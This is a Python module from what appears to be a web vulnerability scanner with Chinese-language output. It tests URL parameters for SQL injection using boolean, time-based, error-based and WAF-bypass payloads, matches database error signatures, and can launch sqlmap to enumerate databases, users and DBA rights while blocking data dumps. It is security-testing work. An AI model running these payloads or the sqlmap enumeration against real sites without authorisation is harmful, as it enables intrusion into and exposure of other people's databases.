"""SQL verification, payload scanning, and sqlmap integration."""

import re
import time
from urllib.parse import parse_qs, quote, urlparse

from . import runtime
from .config import SQL_PAYLOADS, load_custom_payloads
from .core import WAFBypassModule
from .network import request_with_retry
from .params import (
    build_url_with_parameter,
    detect_concatenated_parameters,
    discover_parameters_from_content,
    enhanced_concatenated_parameter_test,
    smart_parameter_discovery,
)
from .runtime import (
    print_debug,
    print_error,
    print_info,
    print_kv,
    print_rule,
    print_section,
    print_success,
    tagged_output,
    print_verbose,
    print_vulnerability,
    print_warning,
)


args = None

_PHASE_LABELS = {
    "discovered parameters": "发现参数",
    "direct parameters": "现有参数",
    "fallback parameters": "备用参数",
    "concatenated parameters": "拼接参数",
}


def _phase_label(phase_name):
    return _PHASE_LABELS.get(phase_name, phase_name)


def auto_sqlmap_enum(url, param_name, args):
    """调用 sqlmap 枚举数据库、当前用户和 DBA 权限，不导出数据。"""
    try:
        import subprocess
        import shlex

        print_section(
            "sqlmap信息枚举",
            (
                ("目标", url),
                ("参数", param_name),
                ("模式", "数据库 / 当前用户 / DBA权限"),
            ),
        )

        sqlmap_cmd = [
            args.sqlmap_path,
            "-u", url,
            "-p", param_name,
            "--dbs",
            "--current-db",
            "--current-user",
            "--is-dba",
        ]

        if args.sqlmap_options:
            extra_options = shlex.split(args.sqlmap_options)
            blocked_dump_options = {"--dump", "--dump-all"}
            rejected_options = [
                option for option in extra_options
                if option.lower() in blocked_dump_options
            ]
            if rejected_options:
                print_warning(
                    "已忽略数据导出参数：" + ", ".join(rejected_options)
                )
                extra_options = [
                    option for option in extra_options
                    if option.lower() not in blocked_dump_options
                ]
            sqlmap_cmd.extend(extra_options)

        if args.proxy:
            sqlmap_cmd.extend(["--proxy", args.proxy])

        if args.cookie:
            sqlmap_cmd.extend(["--cookie", args.cookie])

        print_kv("命令", " ".join(sqlmap_cmd))
        print_warning("sqlmap将在独立进程中运行")

        process = subprocess.Popen(
            sqlmap_cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
            universal_newlines=True
        )

        print_info("正在运行sqlmap")
        print_rule()

        while True:
            output = process.stdout.readline()
            if output == '' and process.poll() is not None:
                break
            if output:
                print(output.strip())

        return_code = process.poll()

        print_rule()
        if return_code == 0:
            print_success("sqlmap执行完成")
        else:
            print_error(f"sqlmap执行失败，退出码：{return_code}")
            stderr_output = process.stderr.read()
            if stderr_output:
                error_msg = stderr_output.strip()
                if error_msg:
                    if len(error_msg) > 200:
                        error_msg = error_msg[:200] + "..."
                    print_error(f"sqlmap错误：{error_msg}")

    except ImportError:
        print_error("无法导入subprocess，无法启动sqlmap")
    except FileNotFoundError:
        print_error(f"找不到sqlmap可执行文件：{args.sqlmap_path}")
        print_info("请安装sqlmap，或使用 --sqlmap-path 指定其路径")
    except Exception as e:
        print_error("sqlmap进程执行失败")

def verify_boolean_differential(test_url, param_name, header, args, repeats=2):
    """
    通过重复的真/假条件对照验证布尔差异。

    同一分组内的响应必须稳定，且两组响应长度需有足够差异，避免把动态页面
    的随机长度变化直接当成SQL盲注。
    """
    verification_pairs = [
        ("' AND 1=1-- -", "' AND 1=2-- -"),
        ("' AND 'a'='a'-- -", "' AND 'a'='b'-- -"),
        ("' OR 1=1-- -", "' OR 1=2-- -"),
    ]

    def collect_responses(payload):
        responses = []
        verify_url = build_url_with_parameter(test_url, param_name, payload)
        for _ in range(repeats):
            response = request_with_retry(
                verify_url,
                header,
                args.timeout,
                args.proxy,
                args.retries
            )
            if response is None or response.status_code >= 400:
                return []
            responses.append(response)
        return responses

    try:
        for payload_true, payload_false in verification_pairs:
            true_responses = collect_responses(payload_true)
            false_responses = collect_responses(payload_false)
            if not true_responses or not false_responses:
                continue

            true_lengths = [len(response.content) for response in true_responses]
            false_lengths = [len(response.content) for response in false_responses]
            true_avg = sum(true_lengths) / len(true_lengths)
            false_avg = sum(false_lengths) / len(false_lengths)

            true_tolerance = max(20, true_avg * 0.02)
            false_tolerance = max(20, false_avg * 0.02)
            if max(true_lengths) - min(true_lengths) > true_tolerance:
                continue
            if max(false_lengths) - min(false_lengths) > false_tolerance:
                continue

            length_diff = abs(true_avg - false_avg)
            required_diff = max(40, max(true_avg, false_avg) * 0.05)
            if length_diff >= required_diff:
                return True
    except Exception as e:
        if args.verbose:
            print_debug(f"SQL注入验证失败：{type(e).__name__}")

    return False

def verify_sql_injection_simple(test_url, param_name, header, args):
    """简单的SQL注入验证函数"""
    return verify_boolean_differential(test_url, param_name, header, args)

def verify_sql_injection_advanced(url, param_name, header, args):
    """高级SQL注入验证函数 - 多种验证方法 + WAF绕过"""
    try:
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)

        # 初始化WAF绕过模块
        waf_bypass = WAFBypassModule()

        # 验证载荷组合
        verification_tests = [
            # 布尔盲注测试
            {
                'name': '布尔盲注',
                'payloads': [
                    ("' AND 1=1-- -", "' AND 1=2-- -"),
                    ("' OR 1=1-- -", "' OR 1=2-- -"),
                    ("' AND 'a'='a'-- -", "' AND 'a'='b'-- -")
                ]
            },
            # 时间盲注测试
            {
                'name': '时间盲注',
                'payloads': [
                    ("' AND SLEEP(3)-- -", "' AND SLEEP(0)-- -"),
                    ("' AND (SELECT SLEEP(3))-- -", "' AND (SELECT SLEEP(0))-- -")
                ]
            },
            # 错误注入测试
            {
                'name': '错误注入',
                'payloads': [
                    ("'", "1"),
                    ("''", "1"),
                    ("' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version,0x7e))-- -", "1")
                ]
            },
            # WAF绕过测试
            {
                'name': 'WAF绕过',
                'payloads': [
                    ("' /**/AND/**/1=1-- -", "' /**/AND/**/1=2-- -"),
                    ("' %41ND 1=1-- -", "' %41ND 1=2-- -"),
                    ("' ANANDD 1=1-- -", "' ANANDD 1=2-- -")
                ]
            }
        ]

        verification_score = 0
        max_score = len(verification_tests) * 3  # 每个测试最多3分

        for test in verification_tests:
            test_score = 0

            for payload_true, payload_false in test['payloads']:
                try:
                    test_params_true = params.copy()
                    test_params_false = params.copy()
                    test_params_true[param_name] = [payload_true]
                    test_params_false[param_name] = [payload_false]

                    query_true = '&'.join([f"{k}={quote(v[0])}" for k, v in test_params_true.items()])
                    query_false = '&'.join([f"{k}={quote(v[0])}" for k, v in test_params_false.items()])

                    url_true = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{query_true}"
                    url_false = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{query_false}"

                    timeout = args.timeout * 0.5 if args.fast_mode else args.timeout
                    retries = 1 if args.fast_mode else min(2, args.retries)  # 验证时最多重试2次

                    start_time = time.time()
                    response_true = request_with_retry(url_true, header, timeout, args.proxy, retries)
                    time_true = time.time() - start_time

                    if not response_true:
                        if args.verbose:
                            print_debug(
                                f"验证请求失败，跳过：{test['name']}"
                            )
                        continue

                    start_time = time.time()
                    response_false = request_with_retry(url_false, header, timeout, args.proxy, retries)
                    time_false = time.time() - start_time

                    if not response_false:
                        if args.verbose:
                            print_debug(
                                f"验证请求失败，跳过：{test['name']}"
                            )
                        continue

                    if response_true and response_false:
                        len_diff = abs(len(response_true.content) - len(response_false.content))
                        time_diff = abs(time_true - time_false)
                        status_diff = response_true.status_code != response_false.status_code

                        if test['name'] == '布尔盲注':
                            if len_diff > 50 or status_diff:
                                test_score += 1
                        elif test['name'] == '时间盲注':
                            if time_diff > 2.5:  # 时间差异大于2.5秒
                                test_score += 1
                        elif test['name'] == '错误注入':
                            # 检查错误关键词
                            error_keywords = ['mysql', 'sql', 'error', 'syntax', 'postgresql', 'oracle']
                            content_lower = response_true.content.decode('utf-8', 'ignore').lower()
                            if any(keyword in content_lower for keyword in error_keywords):
                                test_score += 1

                        if test_score >= 1:
                            break  # 该测试类型已通过，跳到下一个测试

                except Exception as e:
                    if args.verbose:
                        print_debug(
                            f"验证测试失败：{test['name']} "
                            f"（{type(e).__name__}）"
                        )
                    continue

            verification_score += min(test_score, 1)  # 每个测试类型最多贡献1分

        confidence = (verification_score / len(verification_tests)) * 100

        if args.verbose:
            print_debug(
                f"验证得分：{verification_score}/"
                f"{len(verification_tests)}（置信度 {confidence:.1f}%）"
            )

        # 如果基础验证失败，尝试WAF绕过验证
        if verification_score < len(verification_tests) * 0.5:  # 如果得分低于50%
            if args.verbose:
                print_verbose("初始验证结果较弱，正在尝试WAF绕过")

            bypass_score = 0
            test_payloads = ["' OR 1=1-- -", "' AND 1=1-- -", "' UNION SELECT 1-- -"]

            for base_payload in test_payloads:
                try:
                    bypassed_payloads = waf_bypass.get_advanced_payloads(base_payload)

                    for bypass_payload in bypassed_payloads[:3]:  # 只测试前3个绕过载荷
                        try:
                            test_params = params.copy()
                            test_params[param_name] = [bypass_payload]
                            query = '&'.join([f"{k}={quote(v[0])}" for k, v in test_params.items()])
                            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{query}"

                            timeout = args.timeout * 0.5 if args.fast_mode else args.timeout
                            response = request_with_retry(test_url, header, timeout, args.proxy, 1)

                            if response:
                                # 检查响应中的SQL错误特征
                                content = response.content.decode('utf-8', 'ignore').lower()
                                error_patterns = [
                                    'mysql', 'sql syntax', 'ora-', 'postgresql', 'sqlite',
                                    'microsoft ole db', 'odbc', 'jdbc', 'warning:', 'error'
                                ]

                                if any(pattern in content for pattern in error_patterns):
                                    bypass_score += 1
                                    if args.verbose:
                                        print_success(
                                            "WAF绕过载荷已命中："
                                            f"{bypass_payload[:50]}..."
                                        )
                                    break

                        except Exception:
                            continue

                    if bypass_score > 0:
                        break

                except Exception:
                    continue

            # 更新总得分
            if bypass_score > 0:
                verification_score += bypass_score
                if args.verbose:
                    print_success(
                        f"WAF绕过验证增加 {bypass_score} 分"
                    )

        # 如果验证得分太低，可能是网络问题，降级到简单验证
        if verification_score == 0 and args.verbose:
            print_warning(
                "高级验证未通过，可能与网络异常有关"
            )

        # 调整判断标准，考虑WAF绕过得分
        total_tests = len(verification_tests)
        return confidence >= 50.0 or verification_score >= total_tests * 0.4  # 降低阈值，考虑WAF绕过

    except Exception as e:
        if args.verbose:
            print_debug(
                f"高级SQL注入验证失败：{type(e).__name__}"
            )

    return False

SQL_ERROR_PATTERNS = [
    r'mysql_fetch_array\(\)',
    r'Warning.*\Wmysqli?_',
    r'valid MySQL result(?: resource)?',
    r'\[SQLITE_ERROR\]',
    r'SQLite.*error',
    r'sqlite3\.OperationalError',
    r'SQLite3::',
    r'near\s+["\'][^"\']+["\']\s*:\s*syntax error',
    r'You have an error in your SQL syntax',
    r'check the manual that corresponds to your (MySQL|MariaDB) server version',
    r'Unknown column.*in.*field list',
    r'MySqlException|MySQLSyntaxErrorException',
    r'com\.mysql\.jdbc',
    r'Zend_Db_(Select|Adapter|Statement)',
    r'\bPDOException\b',
    r'SQLSTATE\[\d+\]',
    r'PostgreSQL.*ERROR',
    r'valid PostgreSQL result',
    r'Npgsql\.',
    r'PG::SyntaxError:',
    r'org\.postgresql\.(?:util\.PSQLException|jdbc)',
    r'PSQLException',
    r'ERROR:\s+syntax error at or near',
    r'ERROR: parser: parse error at or near',
    r'PostgreSQL query failed',
    r'\bORA-\d{5}\b',
    r'Oracle error',
    r'Oracle.*Driver',
    r'Warning.*\Woci_',
    r'quoted string not properly terminated',
    r'unclosed quotation mark',
    r'Microsoft.*ODBC.*SQL Server',
    r'\[Microsoft\]\[ODBC SQL Server Driver\]',
    r'\[Macromedia\]\[SQLServer JDBC Driver\]',
    r'\[SqlException',
    r'System\.Data\.SqlClient\.SqlException',
    r'Warning.*\Wpg_',
    r'Exception.*Informix',
    r'Warning.*\Wingres_',
    r'Warning.*\Wmsql_',
    r'Warning.*\Wmssql_',
    r'Warning.*\Wsybase_',
]

def find_sql_error(content):
    """返回响应中首个数据库错误特征，未命中时返回None。"""
    for pattern in SQL_ERROR_PATTERNS:
        match = re.search(pattern, content, re.IGNORECASE)
        if match:
            return match
    return None

@tagged_output("SQL")
def test_sql_injection(url):
    global args
    vulnerabilities = []
    print_info("开始SQL注入检测")

    parsed_url = urlparse(url)
    params = parse_qs(parsed_url.query)

    waf_bypass = WAFBypassModule()


    header = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.108 Safari/537.36"
    }
    if args.cookie:
        header["Cookie"] = args.cookie

    original_response = request_with_retry(url, header, args.timeout, args.proxy, args.retries)
    if not original_response:
        return vulnerabilities

    if original_response.status_code >= 400:
        print_verbose(
            f"HTTP状态码为 {original_response.status_code}，跳过SQL注入检测"
        )
        return vulnerabilities

    original_content = original_response.content.decode("utf-8", "ignore")
    original_length = len(original_content)

    if args.smart_param_discovery:
        discovered_params = smart_parameter_discovery(url, original_content, args)
        print_verbose(
            f"参数发现完成：{len(discovered_params)}个候选参数"
        )
    else:
        discovered_params = discover_parameters_from_content(url, original_content)

    has_concat_params = detect_concatenated_parameters(url, original_content)
    if has_concat_params:
        print_verbose("检测到拼接参数，启用专项测试")

    original_params = params.copy()  # 保存原始参数
    test_phases = []  # 测试阶段列表

    if not params:
        print_verbose("URL中没有参数，启用参数发现")

        base_common_params = [
            'id', 'user', 'page', 'cat', 'action', 'item', 'pid', 'uid', 'sid',
            'search', 'query', 'q', 'keyword', 'login', 'admin', 'debug', 'test'
        ]

        if discovered_params:
            print_verbose(
                "发现参数："
                f"{', '.join(discovered_params[:5])}"
                f"{'...' if len(discovered_params) > 5 else ''}"
            )
            combined_params = discovered_params[:8] + base_common_params
        else:
            combined_params = base_common_params

        final_params = list(dict.fromkeys(combined_params))[:12]
        params = {param: ['1'] for param in final_params}

        test_phases.append(('discovered parameters', params.copy()))
        print_verbose(
            f"无参数测试集：{', '.join(list(params.keys()))}"
        )

    else:
        print_verbose(
            f"测试现有参数：{', '.join(list(params.keys()))}"
        )
        test_phases.append(('direct parameters', params.copy()))

        backup_params = params.copy()

        if discovered_params:
            print_verbose(
                "附加参数："
                f"{', '.join(discovered_params[:5])}"
                f"{'...' if len(discovered_params) > 5 else ''}"
            )
            for param in discovered_params[:5]:
                if param not in backup_params:
                    backup_params[param] = ['1']

        base_backup_params = ['id', 'user', 'page', 'search', 'q', 'admin', 'debug', 'test']
        for param in base_backup_params:
            if param not in backup_params:
                backup_params[param] = ['1']

        test_phases.append(('fallback parameters', backup_params))

        if has_concat_params:
            concat_params = backup_params.copy()
            special_concat_params = ['debug', 'test', 'admin', 'config']
            for param in special_concat_params:
                if param not in concat_params:
                    concat_params[param] = ['1']
            test_phases.append(('concatenated parameters', concat_params))
            print_verbose("开始拼接参数测试")

    if args.fast_mode:
        sql_payloads = [
            "'",  # 基础单引号测试
            "' OR 1=1--",  # 经典OR注入
            "admin'--"  # 管理员绕过
        ]
        print_verbose(f"快速模式：使用 {len(sql_payloads)} 个SQL载荷")
    else:
        sql_payloads = [
            "'",  # 基础单引号测试
            "' OR 1=1--",  # 经典OR注入
            "' AND 1=1--",  # AND注入
            "' UNION SELECT NULL--",  # 联合查询
            "admin'--",  # 管理员绕过
            "' OR 'a'='a",  # 字符串比较
            "' AND SLEEP(2)--",  # 时间盲注（减少延时）
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--"  # 报错注入
        ]
        print_verbose(f"标准模式：使用 {len(sql_payloads)} 个SQL载荷")

    if args.waf_bypass:
        print_verbose("正在生成WAF绕过载荷")
        waf_bypass_payloads = []

        base_payloads = ["' OR 1=1--", "' AND 1=1--", "' UNION SELECT NULL--"]
        for base_payload in base_payloads:
            bypassed = waf_bypass.get_advanced_payloads(base_payload)
            waf_bypass_payloads.extend(bypassed[:3])  # 每个基础载荷取前3个绕过版本

        if args.fast_mode:
            sql_payloads.extend(waf_bypass_payloads[:5])  # 快速模式只添加5个
        else:
            sql_payloads.extend(waf_bypass_payloads[:10])  # 标准模式添加10个

        bypass_count = len(waf_bypass_payloads[:10 if not args.fast_mode else 5])
        print_verbose(f"已添加 {bypass_count} 个WAF绕过载荷")

    if args.custom_sql:
        custom_payloads = load_custom_payloads(args.custom_sql)
        if custom_payloads:
            limit = 2 if args.fast_mode else 5
            sql_payloads.extend(custom_payloads[:limit])  # 根据模式限制自定义载荷数量

    if has_concat_params:
        concat_payloads = [
            "';--",  # 注释测试
            "'||'1'='1"  # 逻辑测试
        ]
        sql_payloads.extend(concat_payloads)
        print_verbose(f"已添加 {len(concat_payloads)} 个拼接参数载荷")

    found_injection = False
    injection_points = []
    reported_points = set()
    continue_after_found = getattr(args, "continue_after_found", False)

    for phase_name, phase_params in test_phases:
        if found_injection and phase_name != 'direct parameters':
            print_verbose(
                f"跳过{_phase_label(phase_name)}阶段；已确认漏洞"
            )
            continue

        print_verbose(
            f"开始{_phase_label(phase_name)}阶段"
            f"（{len(phase_params)}个参数）"
        )
        phase_found = False

        for param_name in phase_params.keys():
            if phase_found and not continue_after_found:
                break

            for payload in sql_payloads:
                if phase_found and not continue_after_found:
                    break

                if runtime.should_stop():
                    print_warning("收到中断信号，停止SQL注入检测")
                    return injection_points if injection_points else []

                try:
                    test_urls_to_try = enhanced_concatenated_parameter_test(
                        url, param_name, payload, args
                    )

                    test_urls_with_type = []
                    for i, test_url in enumerate(test_urls_to_try):
                        if i == 0:
                            test_urls_with_type.append(('standard', test_url))
                        elif ';' in test_url:
                            test_urls_with_type.append(('semicolon', test_url))
                        elif '#' in test_url:
                            test_urls_with_type.append(('fragment', test_url))
                        else:
                            test_urls_with_type.append(('enhanced', test_url))

                    test_urls_to_try = test_urls_with_type

                    for url_type, test_url in test_urls_to_try:
                        if phase_found and not continue_after_found:
                            break

                        timeout = args.timeout * 0.5 if args.fast_mode else args.timeout
                        retries = 1 if args.fast_mode else args.retries
                        test_response = request_with_retry(test_url, header, timeout, args.proxy, retries)
                        if test_response is None:
                            continue

                        test_content = test_response.content.decode("utf-8", "ignore")
                        test_length = len(test_content)
                        # 错误页常返回500，因此先检查错误特征，再决定是否做长度对照。
                        error_match = find_sql_error(test_content)
                        if error_match:
                            point_key = (param_name, "error")
                            if point_key in reported_points:
                                break

                            try:
                                if args.verify_injection:
                                    is_confirmed = verify_sql_injection_advanced(
                                        test_url, param_name, header, args
                                    )
                                else:
                                    is_confirmed = verify_sql_injection_simple(
                                        test_url, param_name, header, args
                                    )
                            except Exception:
                                print_warning(
                                    "验证请求异常，该发现将标记为待确认"
                                )
                                is_confirmed = False

                            vuln = {
                                "type": "SQL注入",
                                "url": url,
                                "parameter": param_name,
                                "payload": payload,
                                "test_url": test_url,
                                "evidence": error_match.group(),
                                "risk_level": "高危",
                                "confirmed": is_confirmed,
                                "url_construction_type": url_type
                            }
                            vulnerabilities.append(vuln)
                            injection_points.append(vuln)
                            reported_points.add(point_key)
                            found_injection = True
                            phase_found = True

                            print_vulnerability(vuln)
                            if is_confirmed:
                                if args.auto_sqlmap:
                                    print_info("开始sqlmap信息枚举")
                                    auto_sqlmap_enum(url, param_name, args)
                            break

                        # HTTP错误页没有SQL特征时不参与长度盲注判断。
                        if test_response.status_code >= 400:
                            continue

                        length_diff = abs(test_length - original_length)
                        if length_diff <= 100:
                            continue

                        point_key = (param_name, "blind")
                        if point_key in reported_points:
                            break

                        try:
                            is_confirmed = verify_boolean_differential(
                                test_url, param_name, header, args
                            )
                        except Exception:
                            if args.verbose:
                                print_debug("布尔盲注验证请求失败")
                            is_confirmed = False

                        # 长度变化只作为候选，未通过稳定对照时不报告漏洞。
                        if not is_confirmed:
                            continue

                        vuln = {
                            "type": "SQL注入（布尔盲注）",
                            "url": url,
                            "parameter": param_name,
                            "payload": payload,
                            "test_url": test_url,
                            "evidence": f"稳定响应长度差异: {length_diff} 字符",
                            "risk_level": "高危",
                            "confirmed": True,
                            "url_construction_type": url_type
                        }
                        vulnerabilities.append(vuln)
                        injection_points.append(vuln)
                        reported_points.add(point_key)
                        found_injection = True
                        phase_found = True

                        print_vulnerability(vuln)
                        if args.auto_sqlmap:
                            print_info("开始sqlmap信息枚举")
                            auto_sqlmap_enum(url, param_name, args)
                        break

                except Exception as e:
                    if args.verbose:
                        error_msg = str(e).strip()
                        if len(error_msg) > 100:
                            error_msg = error_msg[:100] + "..."
                        print_debug(f"SQL注入测试失败：{error_msg}")
                    continue

        if found_injection and not continue_after_found:
            print_verbose(
                f"已在{_phase_label(phase_name)}阶段确认漏洞，跳过后续阶段"
            )
            break

    if injection_points:
        runtime.print_section(
            "SQL注入结果",
            (("注入点", len(injection_points)),),
        )
        for i, point in enumerate(injection_points, 1):
            runtime.print_kv(
                f"#{i}",
                f"{point['parameter']} | "
                f"{runtime.display_text(point['type'])} | "
                f"{runtime.display_text(point['risk_level'])}",
            )
    else:
        print_verbose("未发现SQL注入")

    return injection_points
